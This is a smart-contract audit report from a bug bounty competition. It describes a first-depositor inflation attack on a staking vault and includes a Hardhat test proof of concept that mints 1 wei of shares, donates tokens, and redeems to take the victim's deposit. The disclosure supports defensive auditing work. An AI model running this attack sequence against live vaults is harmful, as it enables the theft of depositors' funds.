# 56907 sc critical attacker can steal first depositor s asset with inflation attack

**Submitted on Oct 21st 2025 at 17:02:41 UTC by @kaysoft for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #56907
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

In a sandwich attack, the attacker mints just 1 wei share for 1 wei long token deposit then donate higher than the victim's deposit amount to the Staking.sol vault before the victim's deposit is executed.

This inflates the totalAssets() before the victim's deposit is executed and by the time the victim's deposit is executed, zero shares is minted to the victim due to rounding from inflated to totalAssets() (the denominator in shares calculation).

After the victim's deposit, the attacker calls `emergencyWithdraw(...)` immediately and since there is just 1 wei of shares available on Staking.sol, the attacker uses this 1 wei of shares token to withdraw the totalAssets (this is plus the victim's asset).

And a 10 percent penalty is charged from the `emergencyWithdraw(...)` which makes the attack profitable because the attacker makes at least 80% profit.

### Vulnerability Details

The Staking.sol is vulnerable to an inflation attack because:

1. The `totalAssets(...)` function from the inherited ERC4626 uses the ERC20 `balanceOf(address(this))` to track the total assets.
2. Staking.sol allows minting of zero shares.

`balanceOf(address(this))` can be manipulated by anyone by directly transferring Long token to the Staking.sol increasing the `totalAssets()` value which is used as denominator in calculating shares minted. But before inflating total asset, the attacker mints 1 wei shares token which will be used to withdraw the victim's asset plus the attacker's donated asset.

```soldity
File: solady ERC4626
function totalAssets() public view virtual returns (uint256 assets) {
        assets = SafeTransferLib.balanceOf(asset(), address(this));
    }

function convertToShares(uint256 assets) public view virtual returns (uint256 shares) {
        if (!_useVirtualShares()) {
            uint256 supply = totalSupply();
            return _eitherIsZero(assets, supply)
                ? _initialConvertToShares(assets)
                : FixedPointMathLib.fullMulDiv(assets, supply, totalAssets());
        }
        uint256 o = _decimalsOffset();
        if (o == uint256(0)) {
            return FixedPointMathLib.fullMulDiv(assets, totalSupply() + 1, _inc(totalAssets()));
        }
        return FixedPointMathLib.fullMulDiv(assets, totalSupply() + 10 ** o, _inc(totalAssets()));
    }
```

### Impact Details

Theft of first depositor's asset through inflation attack.

### Recommendation

{% hint style="warning" %}

* Consider tracking total assets with a storage variable instead of relying on `ERC20.balanceOf(...)` which can be manipulated.
* Also consider not allowing minting of zero shares for deposits.
  {% endhint %}

## Proof of Concept

{% stepper %}
{% step %}

### Setup & context

Copy and paste the test below to the `staking.test.ts` file in the `'Staking features'` test suite, then run `yarn test`.

This demonstrates how an attacker can frontrun first deposit by first minting 1 wei of shares, then inflate the total asset by direct donation before the victim's deposit tx is executed resulting in zero shares minted to the victim due to rounding. Then attacker uses 1 wei shares to withdraw the attacker and the victim's assets.
{% endstep %}

{% step %}

### Test code (PoC)

```solidity
it('Inflation attack to steal first deposit', async () => {
      const { staking, long, admin, minter, user1, user2 } = await loadFixture(fixture);

      const amount = ethers.utils.parseEther('100');
      const amountUser2 = ethers.utils.parseEther('202'); 

      //1. Fund user1 and user2
      await long.connect(admin).transfer(user1.address, amount);
      await long.connect(admin).transfer(user2.address, amountUser2);

      //2. Approvals
      await long.connect(user1).approve(staking.address, amount);
      await long.connect(user2).approve(staking.address, amountUser2);

      //3. user2 mints 1 wei 
      await staking.connect(user2).deposit(ethers.BigNumber.from(1), user2.address);

      //4. user2 also increases totalAssets with a donation while totalSupply remain same.
      await long.connect(user2).transfer(staking.address, amountUser2.sub(1));

      //5. user1 deposit is executed after user2's 1 wei mint and donation(inflation)
      const tx = await staking.connect(user1).deposit(amount, user1.address);

      //6. Zero shares minted to user1 causing loss of user1's 100 Long token.
      expect(await staking.balanceOf(user1.address)).to.eq(0);

      //7. User2 uses the 1 wei to withdraw both user2 and user1 deposits paying 10% penalty
      //But making 80% profit
      await staking.connect(user2).emergencyRedeem(ethers.BigNumber.from(1), user2.address, user2.address);

      expect(await long.balanceOf(user2.address)).to.gt(amountUser2);
    });
```

{% endstep %}
{% endstepper %}
